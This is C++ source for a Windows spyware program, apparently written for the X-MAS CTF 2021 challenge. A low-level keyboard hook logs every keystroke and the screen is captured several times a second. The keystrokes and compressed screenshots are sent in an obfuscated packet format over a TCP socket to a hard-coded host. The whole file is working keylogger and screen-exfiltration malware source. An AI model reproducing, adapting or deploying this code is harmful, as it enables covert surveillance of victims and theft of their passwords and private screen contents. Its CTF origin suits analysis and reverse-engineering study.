#include <iostream>
#include <fstream>
#include <winsock2.h>
#include <windows.h>
#include <time.h>
#include <stdio.h>
#include <string.h>

#include "huffman.h"

using namespace std;

struct pixel
{
    unsigned char B;
    unsigned char G;
    unsigned char R;
    unsigned char alpha;
};

class LogPacket
{
protected:
    int timestamp;

public:
    virtual char * serialize() = 0;
    virtual int getPacketSize() = 0;
    virtual ~LogPacket() {};
};

class KeyLogPacket : public LogPacket
{
private:
    char key;

public:
    KeyLogPacket(char key)
    {
        this->key = key;
        this->timestamp = time(0);
    };

    char * serialize()
    {
        char * data = new  char [16];
        data[0] = 'X';
        data[1] = 'M';
        data[2] = 'A';
        data[3] = 'S';

        *(int *)(data + 4) = 1;
        *(int *)(data + 8) = timestamp;

        data[12] = key;
        data[13] = 0;
        data[14] = 0;
        data[15] = 0;

        *(int *)(data + 12) = (*(int *)(data + 12) * (unsigned int)(key)) ^ ~(timestamp - 69420);
        return data;
    }

    int getPacketSize()
    {
        return 16;
    }
};

class ImageLogPacket : public LogPacket
{
private:
    int width;
    int height;
    int comp_size = 0;
    unsigned char * image;
public:
    ImageLogPacket(int width, int height, unsigned char * image)
    {
        this->width = width;
        this->height = height;
        this->image = image;
        this->timestamp = time(0);
    }

    char * serialize()
    {
        char * data = new  char [30 + 266 + width * height * 100];
        data[0] = 'X';
        data[1] = 'M';
        data[2] = 'A';
        data[3] = 'S';

        *(int *)(data + 4) = 2;
        *(int *)(data + 8) = timestamp;
        *(int *)(data + 12) = width;
        *(int *)(data + 16) = height;

        huffmanCompressor * HFC = new huffmanCompressor();

        HFC->updateFrequency((char*)image, width * height * 25);

        //build tree
        HFC->buildTree();

        //output tree in the output file
        data[30] = 'H';
        data[31] = 'C';
        HFC->serialize(data + 40);


        HFC->compressFinal((char*)image, data + 296, width * height * 25, comp_size);
        *(uint64_t *)(data + 32) = (uint64_t)comp_size;

        cout<<"Compressed file size is "<<comp_size<<" ("<<((double)comp_size / (double)(width * height * 25)) * 100.0d<<"% of input size)\n";

        delete HFC;

        return data;
    }

    int getPacketSize()
    {
        return 296 + comp_size;
    }
};

class ScreenshotManager
{
public:
    ScreenshotManager(int, int);
    ~ScreenshotManager();

    int screenshotcolor(pixel * data);
    int screenshotblackwhite(unsigned char * data);
    int savescreenshotcolor(const char * name = NULL);
    int savescreenshotblackwhite(const char * name = NULL);

    int freq[256];

    void clearfreq();

private:
    bool iserrored;

    int screenw;
    int screenh;

    int width;
    int height;

    HDC hScreenDC;
    HDC hMemoryDC;

    BITMAPINFO di;

    HBITMAP hBitmap;
    HBITMAP hOldBitmap;

    bool isValid() { return iserrored; };
};

void ScreenshotManager::clearfreq()
{
    for(int i = 0; i < 256; ++i)
        freq[i] = 0;
}

ScreenshotManager::ScreenshotManager(int width, int height)
{
    this->width = width;
    this->height = height;

    if(!(hScreenDC = CreateDC("DISPLAY", NULL, NULL, NULL)))
    {
        cout<<"Error creating screen DC!\n";
        iserrored = true;
        return;
    }

    screenw = GetDeviceCaps(hScreenDC, HORZRES);
    screenh = GetDeviceCaps(hScreenDC, VERTRES);

    if(!(hMemoryDC = CreateCompatibleDC(hScreenDC)))
    {
        cout<<"Error creating memory DC!\n";
        iserrored = true;
        return;
    }

    ZeroMemory(&di.bmiHeader, sizeof(BITMAPINFOHEADER));
    di.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);

    if(!(hBitmap = CreateCompatibleBitmap(hScreenDC, width, height)))
    {
        cout<<"Error creating compatible bitmap!\n";
        iserrored = true;
        return;
    }

    if (!GetDIBits(hMemoryDC, hBitmap, 0, height, NULL, &di, DIB_RGB_COLORS))
    {
        cout<<"Error filling DIB header!\n";
        iserrored = true;
        return;
    }
}

int ScreenshotManager::screenshotcolor(pixel * data)
{
    hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
    if(!hOldBitmap)
    {
        cout<<"Error selecting bitmap into DC! "<<GetLastError()<<"\n";
        return 0;
    }

    SetStretchBltMode(hMemoryDC, HALFTONE);
    if(!StretchBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, screenw, screenh, SRCCOPY))
    {
        cout<<"Fail at stretchblt!\n";
        return 0;
    }

    if(!GetDIBits(hMemoryDC, hBitmap, 0, height, (LPVOID)data, &di, DIB_RGB_COLORS))
    {
        cout<<"Failed getting pixel data! "<<GetLastError()<<"\n";
        return 0;
    }

    hBitmap = (HBITMAP)SelectObject(hMemoryDC, hOldBitmap);
    if(!hBitmap)
    {
        cout<<"Error selecting bitmap out of DC! "<<GetLastError()<<"\n";
        return 0;
    }

    return 1;
}

int ScreenshotManager::screenshotblackwhite(unsigned char * data)
{
    pixel * buf = new pixel[width * height];
    if(!this->screenshotcolor(buf))
    {
        delete [] buf;
        return 0;
    }

    for(int i = 0; i < height; ++i)
    {
        for(int j = 0; j < width; ++j)
        {
            data[width * i + j] = (unsigned char)((int)(0 + buf[width * i + j].R + buf[width * i + j].G + buf[width * i + j].B ) / 3);
            freq[data[width * i + j]]++;
        }
    }

    delete [] buf;
    return 1;
}

int ScreenshotManager::savescreenshotcolor(const char * name)
{
    ofstream img;
    char timebuf[31];

    pixel * buf = new pixel[width * height];
    if(!this->screenshotcolor(buf))
    {
        delete [] buf;
        return 0;
    }

    if(name == NULL)
    {
        int localtime = time(0);
        sprintf(timebuf, "%d.ppm", localtime);
        img.open(timebuf);

        if(!img.is_open())
            return 0;
    }

    else
    {
        sprintf(timebuf, "%s.ppm", name);
        img.open(timebuf);

        if(!img.is_open())
            return 0;
    }

    img<<"P3\n"<<width<<" "<<height<<"\n256\n";
    for(int i = 0; i < height; ++i)
    {
        for(int j = 0; j < width; ++j)
        {
            img<<(int)buf[width * i + j].R<<" "<<(int)buf[width * i + j].G<<" "<<(int)buf[width * i + j].B<<" ";
        }
        img<<"\n";
    }

    img.close();
    delete [] buf;
    return 1;
}

int ScreenshotManager::savescreenshotblackwhite(const char * name)
{
    ofstream img;
    char timebuf[31];

    pixel * buf = new pixel[width * height];
    if(!this->screenshotcolor(buf))
    {
        delete [] buf;
        return 0;
    }

    if(name == NULL)
    {
        int localtime = time(0);
        sprintf(timebuf, "%d.pgm", localtime);
        img.open(timebuf);

        if(!img.is_open())
            return 0;
    }

    else
    {
        sprintf(timebuf, "%s.pgm", name);
        img.open(timebuf);

        if(!img.is_open())
            return 0;
    }

    img<<"P2\n"<<width<<" "<<height<<"\n256\n";
    for(int i = 0; i < height; ++i)
    {
        for(int j = 0; j < width; ++j)
        {
            int temp = (int)(0 + buf[width * i + j].R + buf[width * i + j].G + buf[width * i + j].B ) / 3;
            freq[temp]++;
            img<<temp<<" ";
        }
        img<<"\n";
    }

    img.close();
    delete [] buf;
    return 1;
}

ScreenshotManager::~ScreenshotManager()
{
    DeleteObject(hBitmap);
    DeleteDC(hScreenDC);
    DeleteDC(hMemoryDC);
}

HANDLE mutex;
int send_wrap(SOCKET s, char * buf, int len, int flags)
{
    int to_send = len;
    int sent = 0;
    int cursor = 0;

    WaitForSingleObject(mutex, INFINITE);

    while(to_send)
    {
        sent = send(s, buf + cursor, to_send, flags);
        if(sent == SOCKET_ERROR)
            return SOCKET_ERROR;

        cursor += sent;
        to_send -= sent;
    }

    ReleaseMutex(mutex);
    return len;
}

HHOOK hKeyHook;
KBDLLHOOKSTRUCT kb, msg;
SOCKET Socket;

int shift = 0;
int caps = 0;
char buf[16];
char * translate(int vk, int up)
{
    memset(buf, 0, 16);

    if (up)
    {
        if ((vk == 0x10) || (vk == 0xa0) || (vk == 0xa1))
            shift = 0;
        return 0;
    }
    else if ((vk == 0x10) || (vk == 0xa0) || (vk == 0xa1))
    {
        shift = 1;
        return 0;   //not necessary to log shift key presses
    }


    if (vk < 0x29)
    {
        switch (vk)
        {
            case 0x14: caps ^= 1; break;
            case 0x20: buf[0] = ' '; break;
        }
        return buf;
    }
    if (vk > 0x69 && vk < 0x70)
        buf[0] = (char)(vk - 0x40);

    else if (vk > 0x6f && vk < 0x88)
        return 0;

    else if (isalpha(vk))
        {
            if (!caps)
            {
                if (shift)
                    buf[0] = (char)(toupper(vk));
                else
                    buf[0] = (char)(tolower(vk));
            }
            else
            {
                if (!shift)
                    buf[0] = (char)(toupper(vk));
                else
                    buf[0] = (char)(tolower(vk));
            }
        }
        else
        {
            switch (vk)
            {
                case '1': if (!shift) buf[0]=(char)vk; else buf[0]='!'; break;
                case '2': if (!shift) buf[0]=(char)vk; else buf[0]='@'; break;
                case '3': if (!shift) buf[0]=(char)vk; else buf[0]='#'; break;
                case '4': if (!shift) buf[0]=(char)vk; else buf[0]='$'; break;
                case '5': if (!shift) buf[0]=(char)vk; else buf[0]='%'; break;
                case '6': if (!shift) buf[0]=(char)vk; else buf[0]='^'; break;
                case '7': if (!shift) buf[0]=(char)vk; else buf[0]='&'; break;
                case '8': if (!shift) buf[0]=(char)vk; else buf[0]='*'; break;
                case '9': if (!shift) buf[0]=(char)vk; else buf[0]='('; break;
                case '0': if (!shift) buf[0]=(char)vk; else buf[0]=')'; break;
                case 0xba: if (!shift) buf[0]=';'; else buf[0]=':'; break;
                case 0xbb: if (!shift) buf[0]='='; else buf[0]='+'; break;
                case 0xbc: if (!shift) buf[0]=','; else buf[0]='<'; break;
                case 0xbd: if (!shift) buf[0]='-'; else buf[0]='_'; break;
                case 0xbe: if (!shift) buf[0]='.'; else buf[0]='>'; break;
                case 0xbf: if (!shift) buf[0]='/'; else buf[0]='?'; break;
                case 0xc0: if (!shift) buf[0]='`'; else buf[0]='~'; break;
                case 0xdb: if (!shift) buf[0]='['; else buf[0]='{'; break;
                case 0xdc: if (!shift) buf[0]='\\'; else buf[0]='|'; break;
                case 0xdd: if (!shift) buf[0]=']'; else buf[0]='}'; break;
                case 0xde: if (!shift) buf[0]='\''; else buf[0]='\"'; break;
            }
        }
    return buf;
}

LRESULT WINAPI KeyEvent(int nCode, WPARAM wParam, LPARAM lParam)
{
    kb = *((KBDLLHOOKSTRUCT*)lParam);
    if(nCode == HC_ACTION)
    {
        if (wParam == WM_KEYUP)
            translate(kb.vkCode, 1);
        else if (wParam == WM_KEYDOWN)
        {
            if(translate(kb.vkCode, 0))
            {
                LogPacket * lp = new KeyLogPacket(buf[0]);
                char * serialized = lp->serialize();
                send_wrap(Socket, serialized, lp->getPacketSize(), 0);

                delete [] serialized;
                delete lp;
            }
        }
    }
    return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}

void keylog()
{
    hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyEvent, GetModuleHandle(NULL), 0);
    MSG message;
    while(GetMessage(&message, NULL, 0, 0))
    {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }
	UnhookWindowsHookEx(hKeyHook);
}

const int targetw = 640;
const int targeth = 360;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
{
    cout << "X-MAS ctf 2k21 spyware\n";

    WSADATA wsaData;
    WSAStartup(MAKEWORD(2,2), &wsaData);
    Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    struct hostent *host;
	//if((host = gethostbyname("10.0.2.2")) == NULL)
	if((host = gethostbyname("192.168.0.101")) == NULL)
	//if((host = gethostbyname("localhost")) == NULL)
	{
		cout<<"Failed to resolve hostname\n";
		WSACleanup();
		//system("PAUSE");
		return 0;
	}

	// Setup our socket address structure
	SOCKADDR_IN SockAddr;
	SockAddr.sin_port = htons(32303);
	SockAddr.sin_family = AF_INET;
	SockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);

	// Attempt to connect to server
	if(connect(Socket, (SOCKADDR*)(&SockAddr), sizeof(SockAddr)) != 0)
	{
		cout<<"Failed to establish connection with server\n";
		WSACleanup();
		//system("PAUSE");
		return 0;
	}

	Sleep(2000);

	if(!CreateThread(NULL, NULL, keylog, NULL, NULL, NULL))
    {
        cout<<"Second thread creation failed!\n";
        return 0;
    }

    //create screenshot manager
    ScreenshotManager * s1 = new ScreenshotManager(targetw, targeth);

    //allocate buffer for 25 frames
    unsigned char * buf = new unsigned char[targeth * targetw * 25];

    //record screen
    int cur_frame = 1;
    while(true)
    {
        s1->screenshotblackwhite(buf + (cur_frame - 1)* targeth * targetw);
        ++cur_frame;

        if(cur_frame % 25 == 0)
        {
            cur_frame = 1;

            LogPacket * lp = new ImageLogPacket(targetw, targeth, (unsigned char *)buf);
            char * serialzed = lp->serialize();

            send_wrap(Socket, serialzed, lp->getPacketSize(), 0);
            delete lp;
        }
        Sleep(200);
    }

//old code for color images
    /*ScreenshotManager * s1 = new ScreenshotManager(960, 540);

    //if(!s1->screenshot(img))
    //    return 0;

    pixel * ss = new pixel[960 * 540];
    for(int i = 0; i < 1; Sleep(200))
    {
        //cout<<"Processing image "<<i<<"\n";
        s1->screenshotcolor(ss);

        LogPacket * lp = new ImageLogPacket(960, 540, (unsigned char *)ss);
        char * serialzed = lp->serialize();
        //cout<<"Serialized packet is "<<lp->getPacketSize()<<" bytes long!\n";

        send_wrap(Socket, serialzed, lp->getPacketSize(), 0);

        delete [] serialzed;
        delete lp;
    }

    delete [] ss;
    delete s1;*/

    return 0;
}
